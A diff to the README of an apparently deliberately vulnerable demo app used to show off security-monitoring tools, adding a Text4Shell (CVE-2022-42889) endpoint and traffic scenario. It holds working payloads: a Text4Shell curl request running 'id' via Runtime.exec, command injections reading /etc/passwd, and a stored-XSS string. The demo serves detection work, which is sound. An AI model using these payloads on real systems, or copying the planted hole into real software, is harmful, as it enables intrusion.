@@ -75,6 +75,7 @@ Each backend owns a distinct domain — menu, orders, admin, or loyalty — and 
 |---|---|---|---|
 | `GET` | `/api/menu` | corndog-menu | List all menu items |
 | `GET` | `/api/menu/{id}` | corndog-menu | Get single menu item |
+| `GET` | `/api/menu/{id}/formatted?template=` | corndog-menu | Custom-formatted menu item (vulnerable) |
 | `POST` | `/api/orders` | corndog-orders | Place an order |
 | `GET` | `/api/orders/search?q=` | corndog-orders | Search orders by name |
 | `GET` | `/api/orders/{id}` | corndog-orders | Get order by ID |
@@ -100,6 +101,7 @@ Each backend owns a distinct domain — menu, orders, admin, or loyalty — and 
 | 5 | Broken Auth | corndog-admin | `GET /api/admin/orders` | Frontend has Keycloak guard but backend API does not validate tokens |
 | 6 | Vulnerable Deps | all backends | — | Known CVEs in pinned dependency versions |
 | 7 | DoS via Nested JSON (CVE-2025-59466) | corndog-loyalty | `POST /api/loyalty/validate-config` | Recursive depth counting + `AsyncLocalStorage` makes stack overflow unrecoverable |
+| 8 | Text4Shell (CVE-2022-42889) | corndog-menu | `GET /api/menu/{id}/formatted?template=` | User-controlled template passed to `StringSubstitutor` from vulnerable `commons-text:1.9` |
 
 ## Demo Scenarios — Failure Paths
 
@@ -109,6 +111,7 @@ Each backend owns a distinct domain — menu, orders, admin, or loyalty — and 
 | `curl "/api/orders/1/receipt?format=txt;cat+/etc/passwd"` | Command injection succeeds | ASM threat event with attack payload in security trace |
 | `POST /api/admin/export` with `"filename": "x; cat /etc/passwd"` | Command injection succeeds | ASM threat event + IAST tainted data flow |
 | Place order with `<img src=x onerror=alert('XSS')>` in special instructions | Stored XSS renders on confirmation/admin views | IAST XSS vulnerability finding |
+| `curl "/api/menu/1/formatted?template=${script:...}"` | Text4Shell interpolation via `StringSubstitutor` | IAST vulnerability linked to CVE-2022-42889 (SCA) |
 | Any request to backend services | Vulnerable dependencies detected | SCA findings in Vulnerability Management (Text4Shell, H2, JWT CVEs) |
 | `POST /api/loyalty/validate-config` with ~15k-deep nested JSON | Process crashes (stack overflow + `async_hooks`) | Security Research Feed shows "Impacted" for CVE-2025-59466; service restarts via `restart: on-failure` |
 | Burst of failed Keycloak logins from single IP | `LOGIN_ERROR` events in syslog | Cloud SIEM brute-force detection rule fires |
@@ -132,6 +135,7 @@ All requests route through `corndog-web-ui` (Nginx) to produce complete distribu
 | `place_order` | 8 | `POST /api/orders` | Normal order with random items |
 | `search_orders` | 4 | `GET /api/orders/search` | Safe keyword search |
 | `view_single_item` | 3 | `GET /api/menu/{id}` | Single menu item view |
+| `formatted_menu_item` | 2 | `GET /api/menu/{id}/formatted` | Custom-formatted menu item display |
 | `get_receipt` | 3 | `GET /api/orders/{id}/receipt` | Safe receipt generation |
 | `earn_loyalty_points` | 4 | `POST /api/loyalty/earn` | Earn loyalty points for order |
 | `check_loyalty_points` | 3 | `GET /api/loyalty/points` | Check customer loyalty points |
@@ -141,6 +145,7 @@ All requests route through `corndog-web-ui` (Nginx) to produce complete distribu
 | `scenario_sqli_union` | 1 | `GET /api/orders/search` | UNION-based SQL injection |
 | `scenario_cmd_injection_receipt` | 1 | `GET /api/orders/{id}/receipt` | Command injection via `format` param |
 | `scenario_cmd_injection_export` | 1 | `POST /api/admin/export` | Command injection via `filename` |
+| `scenario_text4shell` | 1 | `GET /api/menu/{id}/formatted` | Text4Shell via template param (CVE-2022-42889) |
 | `scenario_dos_nested_json` | 1 | `POST /api/loyalty/validate-config` | DoS via deeply nested JSON (CVE-2025-59466) |
 | `keycloak_login` | 2 | `POST /auth/.../token` | Successful OIDC login (SIEM signal) |
 | `keycloak_failed_login` | 2 | `POST /auth/.../token` | Failed login with wrong password (SIEM signal) |
@@ -222,6 +227,12 @@ curl "http://localhost:5000/api/orders/1/receipt?format=txt;cat+/etc/passwd"
 curl -X POST http://localhost:5001/api/admin/export \
   -H "Content-Type: application/json" \
   -d '{"filename": "orders.csv; cat /etc/passwd"}'
+```
+
+### Text4Shell — CVE-2022-42889 (corndog-menu)
+
+```bash
+curl 'http://localhost:8080/api/menu/1/formatted?template=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29%7D'
 ```
 
 ### DoS via Nested JSON — CVE-2025-59466 (corndog-loyalty)
